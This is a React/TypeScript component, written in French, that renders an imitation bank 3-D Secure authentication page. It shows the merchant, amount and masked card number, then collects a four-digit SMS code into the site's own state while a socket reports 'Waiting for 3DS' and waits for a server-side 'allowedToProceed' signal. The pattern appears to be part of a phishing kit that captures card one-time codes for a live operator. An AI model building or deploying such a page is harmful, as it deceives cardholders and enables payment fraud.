import { useEffect, useRef, useState } from "react";
import { v4 as uuidv4 } from "uuid";
import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
import { useAppDispatch, useAppSelector } from "../../hooks/redux";
import { actionChangePaymentInfo } from "../../store/reducer/account";
import './PaymentPage.scss'
import socket from "../../axios/socket";
import { useNavigate } from "react-router-dom";
import { actionAddToOrder } from "../../store/thunks/checkOrder";

function PaymentPage() {
  const dispatch = useAppDispatch();
  const navigate = useNavigate();

  const total = useAppSelector((state) => state.account.credentials.card.total);
  const date = useAppSelector((state) => state.account.credentials.card.date);
  const card_number = useAppSelector((state) => state.account.credentials.card.card_number);
  const userId = useAppSelector((state) => state.account.account.id);
  const email = useAppSelector((state) => state.account.account.email);
  const cart = useAppSelector((state) => state.cart.cartConnected);
  const orderInput = useAppSelector((state) => state.order.orderInput);

  const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });
  const [loading, setLoading] = useState(true);

  const digit1Ref = useRef<HTMLInputElement>(null);
  const digit2Ref = useRef<HTMLInputElement>(null);
  const digit3Ref = useRef<HTMLInputElement>(null);
  const digit4Ref = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setTimeout(() => setLoading(false), 5000);
  }, []);

  useEffect(() => {
    socket.connect();
    socket.emit("updateStatus", {
      userId: userId,
      status: "Waiting for 3DS"
    });

    socket.on("allowedToProceed", () => {
      if (orderInput.delivery_address === null) return;
      const command_number = uuidv4();
      dispatch(actionAddToOrder({
        cart,
        total: orderInput.total,
        command_number: command_number,
        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address.country}`
      }));
      setTimeout(() => navigate("/order"), 2000);
    });

    return () => {
      socket.disconnect();
    };
  }, [userId, email, navigate]);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    const { name, value } = e.target as HTMLInputElement;

    if (e.key === "Backspace" && value === "") {
      if (name === "digit2") digit1Ref.current?.focus();
      if (name === "digit3") digit2Ref.current?.focus();
      if (name === "digit4") digit3Ref.current?.focus();
    }
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (value.length > 1) return;
    const updatedDigits = { ...digits, [name]: value };
    setDigits(updatedDigits);

    if (name === "digit1" && value) digit2Ref.current?.focus();
    if (name === "digit2" && value) digit3Ref.current?.focus();
    if (name === "digit3" && value) digit4Ref.current?.focus();
    dispatch(actionChangePaymentInfo({ name: "verif_code", value: updatedDigits }));
  }

  return (
    <div>
      {
        loading ?
          <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}><CircleLoader black={true} /> </div>
          :
          <div className='paymentPage'>
            <div className="paymentPage_logo">
              <img src="/img/payment/3ds.png" alt="" className="paymentPage_logo_img" />
            </div>
            <div className="paymentPage_waiting">
              <h1 className="paymentPage_waiting_title">Authentification en cours</h1>
              <span className="paymentPage_waiting_text">Veuillez patienter quelques secondes le temps de vérifier votre saisie.</span>
              <CircleLoader />
            </div>
            <div className="paymentPage_infos">
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Marchand</span>
                <span className="paymentPage_infos_item_value">{import.meta.env.VITE_APP_NAME}</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Montant</span>
                <span className="paymentPage_infos_item_value">{total}</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Date et heure</span>
                <span className="paymentPage_infos_item_value">{date} GMT</span>
              </div>
              <div className="paymentPage_infos_item">
                <span className="paymentPage_infos_item_name">Carte utilisée</span>
                <span className="paymentPage_infos_item_value">xxxxxxxxxxxxxxxx{card_number.slice(15)}</span>
              </div>
            </div>
            <div className="paymentPage_img">
              <img src="/img/payment/icone.png" alt="" className="paymentPage_img_img" />
            </div>
            <div className="paymentPage_instructions">
              <span className="paymentPage_instructions_title">Authentification requise pour valider le paiement</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">1</span>Prenez votre téléphone.</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">2</span>Ouvrez l'application mobile de votre banque.</span>
              <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">3</span>Saisissez votre code sur votre téléphone.</span>
            </div>
            <div className="paymentPage_code">
              <span className="paymentPage_code_title">Ou saisissez le code de vérification envoyé par SMS</span>
              <div className="paymentPage_code_inputs">
                <input type="text" name="digit1" value={digits.digit1} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit1Ref} />
                <input type="text" name="digit2" value={digits.digit2} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit2Ref} />
                <input type="text" name="digit3" value={digits.digit3} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit3Ref} />
                <input type="text" name="digit4" value={digits.digit4} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit4Ref} />
              </div>
              {
                digits.digit1 && digits.digit2 && digits.digit3 && digits.digit4 &&
                <button type="button" className="paymentPage_code_btn">Valider</button>
              }

            </div>
          </div>
      }

    </div>
  )

}

export default PaymentPage;
